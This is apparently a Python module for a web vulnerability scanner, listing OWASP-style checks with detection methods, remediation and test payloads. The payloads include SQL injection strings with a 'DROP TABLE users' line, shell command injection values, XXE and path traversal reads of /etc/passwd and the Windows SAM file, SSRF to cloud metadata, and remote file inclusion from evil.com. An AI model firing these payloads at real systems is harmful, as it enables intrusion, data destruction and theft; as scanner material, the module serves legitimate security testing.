"""
Comprehensive Vulnerability Checker

This module provides a detailed checklist of web vulnerabilities
with detection methods, payloads, indicators, and remediation.
Used for systematic vulnerability scanning.
"""

from typing import List, Dict, Optional
from dataclasses import dataclass, field


@dataclass
class VulnerabilityCheck:
    """A single vulnerability check with all details."""
    id: str
    name: str
    category: str
    severity: str  # critical, high, medium, low
    description: str
    detection_method: str
    payloads: List[str] = field(default_factory=list)
    indicators: List[str] = field(default_factory=list)
    remediation: str = ""
    cwe_id: str = ""
    owasp_ref: str = ""


# OWASP Top 10 and common vulnerability checks
VULNERABILITY_CHECKS: List[VulnerabilityCheck] = [
    # =========================================================================
    # INJECTION (A03:2021)
    # =========================================================================
    VulnerabilityCheck(
        id="sqli-error",
        name="SQL Injection (Error-based)",
        category="Injection",
        severity="critical",
        description="Error-based SQL injection via malicious input",
        detection_method="Submit SQL metacharacters and check for database errors",
        payloads=["'", "\"", "' OR '1'='1", "' OR 1=1--", "1; DROP TABLE users--"],
        indicators=["SQL syntax", "mysql", "postgresql", "ORA-", "sqlite"],
        remediation="Use parameterized queries and prepared statements",
        cwe_id="CWE-89",
        owasp_ref="A03:2021"
    ),
    VulnerabilityCheck(
        id="sqli-blind",
        name="SQL Injection (Blind)",
        category="Injection",
        severity="critical",
        description="Time-based or boolean-based blind SQL injection",
        detection_method="Compare response times or content differences",
        payloads=["' AND SLEEP(5)--", "' AND 1=1--", "' AND 1=2--"],
        indicators=["Response time difference", "Content difference"],
        remediation="Use parameterized queries and prepared statements",
        cwe_id="CWE-89",
        owasp_ref="A03:2021"
    ),
    VulnerabilityCheck(
        id="cmd-injection",
        name="OS Command Injection",
        category="Injection",
        severity="critical",
        description="Injection of OS commands into application",
        detection_method="Submit shell metacharacters and check output",
        payloads=["; id", "| whoami", "& dir", "`id`", "$(whoami)"],
        indicators=["uid=", "root:", "Directory of", "Windows IP"],
        remediation="Avoid shell commands, use safe APIs",
        cwe_id="CWE-78",
        owasp_ref="A03:2021"
    ),
    VulnerabilityCheck(
        id="ldap-injection",
        name="LDAP Injection",
        category="Injection",
        severity="high",
        description="Injection into LDAP queries",
        detection_method="Submit LDAP metacharacters and check for errors",
        payloads=["*", "*)(&", "*)(|", "admin)(&)"],
        indicators=["LDAP", "Invalid DN", "ldap_search", "ldap_bind"],
        remediation="Escape LDAP special characters",
        cwe_id="CWE-90",
        owasp_ref="A03:2021"
    ),
    VulnerabilityCheck(
        id="xpath-injection",
        name="XPath Injection",
        category="Injection",
        severity="high",
        description="Injection into XPath queries",
        detection_method="Submit XPath metacharacters",
        payloads=["' or '1'='1", "' or ''='", "admin' or '1'='1"],
        indicators=["XPath", "XPATH", "XML parsing error"],
        remediation="Parameterize XPath queries",
        cwe_id="CWE-643",
        owasp_ref="A03:2021"
    ),

    # =========================================================================
    # BROKEN AUTHENTICATION (A07:2021)
    # =========================================================================
    VulnerabilityCheck(
        id="auth-bypass",
        name="Authentication Bypass",
        category="Broken Authentication",
        severity="critical",
        description="Bypass authentication mechanisms",
        detection_method="Test for default credentials, SQL injection in login",
        payloads=["admin/admin", "' OR '1'='1", "admin'--"],
        indicators=["Welcome", "Dashboard", "Admin", "logged in"],
        remediation="Implement proper authentication checks",
        cwe_id="CWE-287",
        owasp_ref="A07:2021"
    ),
    VulnerabilityCheck(
        id="weak-password",
        name="Weak Password Policy",
        category="Broken Authentication",
        severity="medium",
        description="Application allows weak passwords",
        detection_method="Attempt registration with weak password",
        payloads=["123456", "password", "admin"],
        indicators=["Password accepted", "Account created"],
        remediation="Enforce strong password policy",
        cwe_id="CWE-521",
        owasp_ref="A07:2021"
    ),
    VulnerabilityCheck(
        id="session-fixation",
        name="Session Fixation",
        category="Broken Authentication",
        severity="high",
        description="Session ID not regenerated after login",
        detection_method="Check if session ID changes after authentication",
        payloads=[],
        indicators=["Same session ID before and after login"],
        remediation="Regenerate session after authentication",
        cwe_id="CWE-384",
        owasp_ref="A07:2021"
    ),

    # =========================================================================
    # SENSITIVE DATA EXPOSURE (A02:2021)
    # =========================================================================
    VulnerabilityCheck(
        id="info-disclosure",
        name="Information Disclosure",
        category="Sensitive Data Exposure",
        severity="medium",
        description="Application exposes sensitive information",
        detection_method="Check error messages, headers, responses",
        payloads=[],
        indicators=["Stack trace", "Version info", "Internal IP", "Path disclosure"],
        remediation="Implement proper error handling, remove debug info",
        cwe_id="CWE-200",
        owasp_ref="A02:2021"
    ),
    VulnerabilityCheck(
        id="no-https",
        name="Missing HTTPS",
        category="Sensitive Data Exposure",
        severity="high",
        description="Sensitive data transmitted without encryption",
        detection_method="Check if login/payment forms use HTTPS",
        payloads=[],
        indicators=["http:// on login forms"],
        remediation="Enable HTTPS everywhere",
        cwe_id="CWE-319",
        owasp_ref="A02:2021"
    ),

    # =========================================================================
    # XXE (A05:2021)
    # =========================================================================
    VulnerabilityCheck(
        id="xxe-file",
        name="XXE File Disclosure",
        category="XXE",
        severity="critical",
        description="XML External Entity to read files",
        detection_method="Submit XML with external entity referencing files",
        payloads=[
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        ],
        indicators=["root:", "/etc/passwd content", "win.ini content"],
        remediation="Disable DTDs and external entities",
        cwe_id="CWE-611",
        owasp_ref="A05:2021"
    ),
    VulnerabilityCheck(
        id="xxe-ssrf",
        name="XXE SSRF",
        category="XXE",
        severity="critical",
        description="XXE to perform server-side requests",
        detection_method="Submit XML with external entity accessing internal URLs",
        payloads=[
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>'
        ],
        indicators=["Internal service response", "localhost content"],
        remediation="Disable DTDs and external entities",
        cwe_id="CWE-918",
        owasp_ref="A05:2021"
    ),

    # =========================================================================
    # BROKEN ACCESS CONTROL (A01:2021)
    # =========================================================================
    VulnerabilityCheck(
        id="idor",
        name="Insecure Direct Object Reference",
        category="Broken Access Control",
        severity="high",
        description="Direct access to objects via user-supplied input",
        detection_method="Modify object IDs in requests",
        payloads=["id=1", "id=2", "user_id=admin"],
        indicators=["Access to other user data", "Unauthorized content"],
        remediation="Implement proper authorization checks",
        cwe_id="CWE-639",
        owasp_ref="A01:2021"
    ),
    VulnerabilityCheck(
        id="privilege-escalation",
        name="Privilege Escalation",
        category="Broken Access Control",
        severity="critical",
        description="User can access admin functions",
        detection_method="Access admin endpoints as regular user",
        payloads=["/admin", "/admin/users", "role=admin"],
        indicators=["Admin panel access", "User management"],
        remediation="Enforce role-based access control",
        cwe_id="CWE-269",
        owasp_ref="A01:2021"
    ),
    VulnerabilityCheck(
        id="path-traversal",
        name="Path Traversal",
        category="Broken Access Control",
        severity="high",
        description="Access files outside web root",
        detection_method="Submit path traversal sequences",
        payloads=["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"],
        indicators=["root:", "file content outside webroot"],
        remediation="Validate and sanitize file paths",
        cwe_id="CWE-22",
        owasp_ref="A01:2021"
    ),

    # =========================================================================
    # SECURITY MISCONFIGURATION (A05:2021)
    # =========================================================================
    VulnerabilityCheck(
        id="cors-misconfig",
        name="CORS Misconfiguration",
        category="Misconfiguration",
        severity="medium",
        description="Overly permissive CORS policy",
        detection_method="Check Access-Control-Allow-Origin header",
        payloads=["Origin: https://evil.com"],
        indicators=["Access-Control-Allow-Origin: *", "Reflected origin"],
        remediation="Restrict CORS to trusted origins",
        cwe_id="CWE-942",
        owasp_ref="A05:2021"
    ),
    VulnerabilityCheck(
        id="directory-listing",
        name="Directory Listing Enabled",
        category="Misconfiguration",
        severity="low",
        description="Web server lists directory contents",
        detection_method="Access directories without index files",
        payloads=["/", "/images/", "/uploads/"],
        indicators=["Index of", "Directory listing", "Parent Directory"],
        remediation="Disable directory listing",
        cwe_id="CWE-548",
        owasp_ref="A05:2021"
    ),
    VulnerabilityCheck(
        id="missing-headers",
        name="Missing Security Headers",
        category="Misconfiguration",
        severity="low",
        description="Important security headers not set",
        detection_method="Check response headers",
        payloads=[],
        indicators=["Missing X-Frame-Options", "Missing CSP", "Missing X-XSS-Protection"],
        remediation="Add security headers",
        cwe_id="CWE-693",
        owasp_ref="A05:2021"
    ),

    # =========================================================================
    # XSS (A03:2021)
    # =========================================================================
    VulnerabilityCheck(
        id="xss-reflected",
        name="Reflected XSS",
        category="XSS",
        severity="medium",
        description="Input reflected in response without encoding",
        detection_method="Submit XSS payload and check if reflected",
        payloads=["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        indicators=["Payload reflected unencoded"],
        remediation="Encode output, implement CSP",
        cwe_id="CWE-79",
        owasp_ref="A03:2021"
    ),
    VulnerabilityCheck(
        id="xss-stored",
        name="Stored XSS",
        category="XSS",
        severity="high",
        description="Input stored and displayed to other users",
        detection_method="Submit XSS and check if persisted",
        payloads=["<script>alert(1)</script>", "<svg onload=alert(1)>"],
        indicators=["Payload stored and rendered"],
        remediation="Encode output, sanitize input",
        cwe_id="CWE-79",
        owasp_ref="A03:2021"
    ),
    VulnerabilityCheck(
        id="xss-dom",
        name="DOM-based XSS",
        category="XSS",
        severity="medium",
        description="Client-side script processes untrusted data",
        detection_method="Check for dangerous DOM sinks",
        payloads=["#<script>alert(1)</script>", "?search=<img onerror=alert(1)>"],
        indicators=["innerHTML", "document.write", "eval"],
        remediation="Use safe DOM methods, encode data",
        cwe_id="CWE-79",
        owasp_ref="A03:2021"
    ),

    # =========================================================================
    # INSECURE DESERIALIZATION (A08:2021)
    # =========================================================================
    VulnerabilityCheck(
        id="deserialize",
        name="Insecure Deserialization",
        category="Deserialization",
        severity="critical",
        description="Untrusted data deserialized unsafely",
        detection_method="Submit serialized objects",
        payloads=["ysoserial payloads", "pickle payloads"],
        indicators=["RCE", "object instantiation"],
        remediation="Avoid deserializing untrusted data",
        cwe_id="CWE-502",
        owasp_ref="A08:2021"
    ),

    # =========================================================================
    # SSRF
    # =========================================================================
    VulnerabilityCheck(
        id="ssrf",
        name="Server-Side Request Forgery",
        category="SSRF",
        severity="high",
        description="Server makes requests to attacker-controlled URLs",
        detection_method="Submit internal URLs in parameters",
        payloads=["http://127.0.0.1/", "http://169.254.169.254/"],
        indicators=["Internal content", "Cloud metadata"],
        remediation="Whitelist allowed URLs, block internal IPs",
        cwe_id="CWE-918",
        owasp_ref="A10:2021"
    ),

    # =========================================================================
    # FILE UPLOAD
    # =========================================================================
    VulnerabilityCheck(
        id="file-upload",
        name="Unrestricted File Upload",
        category="File Upload",
        severity="critical",
        description="Upload malicious files to server",
        detection_method="Upload executable files",
        payloads=["shell.php", "shell.jsp", "shell.aspx"],
        indicators=["Upload success", "File accessible"],
        remediation="Validate file types, store outside webroot",
        cwe_id="CWE-434",
        owasp_ref="A04:2021"
    ),

    # =========================================================================
    # CSRF
    # =========================================================================
    VulnerabilityCheck(
        id="csrf",
        name="Cross-Site Request Forgery",
        category="CSRF",
        severity="medium",
        description="Forged requests on behalf of user",
        detection_method="Check for CSRF tokens",
        payloads=[],
        indicators=["No CSRF token", "Predictable token"],
        remediation="Implement CSRF tokens",
        cwe_id="CWE-352",
        owasp_ref="A01:2021"
    ),

    # =========================================================================
    # OPEN REDIRECT
    # =========================================================================
    VulnerabilityCheck(
        id="open-redirect",
        name="Open Redirect",
        category="Redirect",
        severity="medium",
        description="Application redirects to attacker-controlled URL",
        detection_method="Submit external URLs in redirect parameters",
        payloads=["//evil.com", "https://evil.com", "/\\evil.com"],
        indicators=["Redirect to external domain"],
        remediation="Validate redirect URLs",
        cwe_id="CWE-601",
        owasp_ref="A01:2021"
    ),

    # =========================================================================
    # SSTI
    # =========================================================================
    VulnerabilityCheck(
        id="ssti",
        name="Server-Side Template Injection",
        category="SSTI",
        severity="critical",
        description="Template engine executes attacker input",
        detection_method="Submit template expressions",
        payloads=["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
        indicators=["49 in response", "Template error"],
        remediation="Sandbox templates, avoid user input in templates",
        cwe_id="CWE-94",
        owasp_ref="A03:2021"
    ),

    # =========================================================================
    # LFI/RFI
    # =========================================================================
    VulnerabilityCheck(
        id="lfi",
        name="Local File Inclusion",
        category="File Inclusion",
        severity="high",
        description="Include local files in application",
        detection_method="Submit file paths in parameters",
        payloads=["../../etc/passwd", "..\\..\\windows\\system32\\drivers\\etc\\hosts"],
        indicators=["root:", "localhost"],
        remediation="Validate file paths, use whitelist",
        cwe_id="CWE-98",
        owasp_ref="A03:2021"
    ),
    VulnerabilityCheck(
        id="rfi",
        name="Remote File Inclusion",
        category="File Inclusion",
        severity="critical",
        description="Include remote files in application",
        detection_method="Submit URLs in parameters",
        payloads=["http://evil.com/shell.txt", "ftp://evil.com/shell"],
        indicators=["Remote content included"],
        remediation="Disable remote file inclusion",
        cwe_id="CWE-98",
        owasp_ref="A03:2021"
    ),
]


def get_checks_by_category(category: str) -> List[VulnerabilityCheck]:
    """Get all checks for a category."""
    return [c for c in VULNERABILITY_CHECKS if c.category.lower() == category.lower()]


def get_checks_by_severity(severity: str) -> List[VulnerabilityCheck]:
    """Get all checks for a severity level."""
    return [c for c in VULNERABILITY_CHECKS if c.severity.lower() == severity.lower()]


def get_check_by_id(check_id: str) -> Optional[VulnerabilityCheck]:
    """Get a check by ID."""
    for check in VULNERABILITY_CHECKS:
        if check.id == check_id:
            return check
    return None


def get_checks_by_owasp(owasp_ref: str) -> List[VulnerabilityCheck]:
    """Get all checks for an OWASP reference."""
    return [c for c in VULNERABILITY_CHECKS if owasp_ref in c.owasp_ref]


def get_payloads_for_check(check_id: str) -> List[str]:
    """Get payloads for a specific check."""
    check = get_check_by_id(check_id)
    return check.payloads if check else []


def get_all_categories() -> List[str]:
    """Get all unique categories."""
    return list(set(c.category for c in VULNERABILITY_CHECKS))


def get_stats() -> Dict:
    """Get vulnerability check statistics."""
    by_category = {}
    by_severity = {}
    
    for check in VULNERABILITY_CHECKS:
        by_category[check.category] = by_category.get(check.category, 0) + 1
        by_severity[check.severity] = by_severity.get(check.severity, 0) + 1
    
    return {
        "total": len(VULNERABILITY_CHECKS),
        "by_category": by_category,
        "by_severity": by_severity
    }


def print_checklist():
    """Print the vulnerability checklist."""
    print(f"=== VULNERABILITY CHECKLIST ({len(VULNERABILITY_CHECKS)} checks) ===\n")
    
    current_category = None
    for check in VULNERABILITY_CHECKS:
        if check.category != current_category:
            current_category = check.category
            print(f"\n[{current_category.upper()}]")
        
        severity_icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}.get(check.severity, "⚪")
        print(f"  {severity_icon} {check.name} ({check.id})")


if __name__ == "__main__":
    print_checklist()
    print("\nStats:", get_stats())
